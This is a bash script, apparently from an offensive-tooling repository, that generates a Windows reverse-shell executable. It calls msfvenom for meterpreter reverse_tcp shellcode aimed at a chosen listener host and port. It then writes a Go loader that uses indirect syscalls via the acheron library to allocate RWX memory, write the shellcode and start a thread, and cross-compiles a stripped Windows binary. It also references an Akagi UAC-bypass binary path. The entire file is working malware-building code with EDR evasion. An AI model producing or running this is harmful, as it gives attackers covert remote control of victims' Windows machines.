#!/bin/bash
# Acheron Payload Generator
# Portable, no hardcoded paths

set -euo pipefail

# Verbose ON by default, --quiet/-q to disable, --verbose/-v accepted for compatibility
VERBOSE=true
ARGS=()
for arg in "$@"; do
    case "$arg" in
        --quiet|-q)
            VERBOSE=false
            ;;
        --verbose|-v)
            # Verbose is already on by default, just ignore
            ;;
        *)
            ARGS+=("$arg")
            ;;
    esac
done
set -- "${ARGS[@]}"

LHOST="${1:-}"; LPORT="${2:-}"

if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo "Usage: $0 <LHOST> <LPORT>" >&2
    exit 1
fi

# Validate LPORT: numeric, 1-65535
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then
    echo "Error: LPORT must be numeric (1-65535)" >&2
    exit 1
fi

# Normalize output filename (replace problematic chars)
SANITIZED_LHOST=$(echo "$LHOST" | sed 's/[^a-zA-Z0-9._-]/_/g')
SANITIZED_LPORT=$(echo "$LPORT" | sed 's/[^0-9]/_/g')
WORKDIR=$(mktemp -d)
OUTFILE="acheron_${SANITIZED_LHOST}_${SANITIZED_LPORT}.exe"

# Default path for Akagi (updated for current repo)
AKAGI_DEFAULT_PATH="$(cd "$(dirname "$0")" && pwd)/bin/akagi.exe"

# Cleanup on exit
trap 'rm -rf "${WORKDIR:-}"' EXIT INT TERM

cd "$WORKDIR"

log() { [ "$VERBOSE" = true ] && echo -e "\e[1;36m[VERBOSE]\e[0m $*"; }
info() { echo -e "\e[1;32m[+]\e[0m $*"; }
err() { echo -e "\e[1;31m[-]\e[0m $*"; }

info "Generating shellcode for $LHOST:$LPORT..."
log "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hex EXITFUNC=thread"

# Capture msfvenom output and exit code properly - FIX #1
MSF_OUT=""
MSF_EXIT=0
MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1)
MSF_EXIT=$?
if [ $MSF_EXIT -ne 0 ]; then
    err "msfvenom failed (exit $MSF_EXIT)"
    echo "$MSF_OUT"
    exit 1
fi

# Filter out msfvenom warning messages - extract ONLY the pure hex line
SHELLCODE=$(echo "$MSF_OUT" | grep -E '^[0-9a-fA-F]{100,}$' | head -1 | tr -d '\n\r ')

if [ -z "$SHELLCODE" ]; then
    err "msfvenom produced no shellcode"
    echo "$MSF_OUT"
    exit 1
fi

echo "$SHELLCODE" > sc.hex
log "msfvenom OK - Shellcode: $((${#SHELLCODE}/2)) bytes"

HEX=""
for i in $(seq 0 2 $((${#SHELLCODE}-2))); do
    HEX="${HEX}0x${SHELLCODE:$i:2},"
done
# Remove trailing comma
HEX="${HEX%,}"

log "Writing main.go..."
# Write main.go with the HEX array properly expanded - FIX #10: error checking
cat > main.go << 'GOEOF'
package main

import (
	"unsafe"
	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

var scHex = []byte{HEX_PLACEHOLDER}

func main() {
	var a, b uintptr
	h := uintptr(0xffffffffffffffff)
	
	ach, err := acheron.New()
	if err != nil {
		panic("acheron.New failed: " + err.Error())
	}
	n := len(scHex)
	
	r1, err1 := ach.Syscall(ach.HashString("NtAllocateVirtualMemory"), h, uintptr(unsafe.Pointer(&a)), 0, uintptr(unsafe.Pointer(&n)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if r1 != 0 || err1 != nil {
		panic("NtAllocateVirtualMemory failed")
	}
	
	r2, err2 := ach.Syscall(ach.HashString("NtWriteVirtualMemory"), h, a, uintptr(unsafe.Pointer(&scHex[0])), uintptr(n), 0)
	if r2 != 0 || err2 != nil {
		panic("NtWriteVirtualMemory failed")
	}
	
	r3, err3 := ach.Syscall(ach.HashString("NtCreateThreadEx"), uintptr(unsafe.Pointer(&b)), windows.GENERIC_EXECUTE, 0, h, a, 0, 0, 0, 0, 0, 0)
	if r3 != 0 || err3 != nil {
		panic("NtCreateThreadEx failed")
	}
	
	windows.WaitForSingleObject(windows.Handle(b), 0xffffffff)
}
GOEOF

# Replace placeholder with actual HEX
sed -i "s/HEX_PLACEHOLDER/${HEX}/" main.go

log "Go mod init..."
GO_MOD_OUT=$(go mod init tmp 2>&1)
[ "$VERBOSE" = true ] && echo "$GO_MOD_OUT"

log "Downloading dependencies (timeout 120s)..."
timeout 120 go get github.com/f1zm0/acheron@v1.0.0 golang.org/x/sys/windows@v0.47.0 2>&1 | tee "$WORKDIR/go_get.log"
[ "$VERBOSE" = true ] && grep -v "go: downloading" "$WORKDIR/go_get.log" || true

# Run go mod tidy to generate go.sum - FIX #11
log "Running go mod tidy..."
go mod tidy

info "Building GOOS=windows GOARCH=amd64..."
log "GOOS=windows GOARCH=amd64 go build -v -ldflags=\"-s -w\" -o $OUTFILE main.go"
log "Target: Windows x64 (amd64)"
log "Strip flags: -s (symbols) -w (DWARF)"

# Build without set -e interference - run build in subshell, capture exit code
log "Starting build (timeout 300s)..."
(
    set +e
    GOOS=windows GOARCH=amd64 timeout 300 go build -v -ldflags="-s -w" -o "$OUTFILE" main.go 2>&1
    echo "BUILD_EXIT:$?" > "$WORKDIR/build_exit_code"
) | tee "$WORKDIR/go_build.log" &
BUILD_PID=$!
log "Build started (PID: $BUILD_PID). Waiting..."
wait $BUILD_PID

# Default to failure if exit code file missing
BUILD_EXIT=1
if [ -f "$WORKDIR/build_exit_code" ]; then
    BUILD_EXIT=$(cat "$WORKDIR/build_exit_code" | cut -d: -f2)
fi
BUILD_OUT=$(cat "$WORKDIR/go_build.log" 2>/dev/null || echo "timeout or error")

if [ "$BUILD_EXIT" -eq 0 ]; then
    cd - >/dev/null
    mv "$WORKDIR/$OUTFILE" "./$OUTFILE"
    info "Generated: ./$OUTFILE ($(ls -lh "./$OUTFILE" | awk '{print $5}'))"
    log "Binary: $(file "./$OUTFILE" 2>/dev/null || echo 'PE32+ executable')"
else
    err "Build failed (exit $BUILD_EXIT)"
    echo "$BUILD_OUT"
    exit 1
fi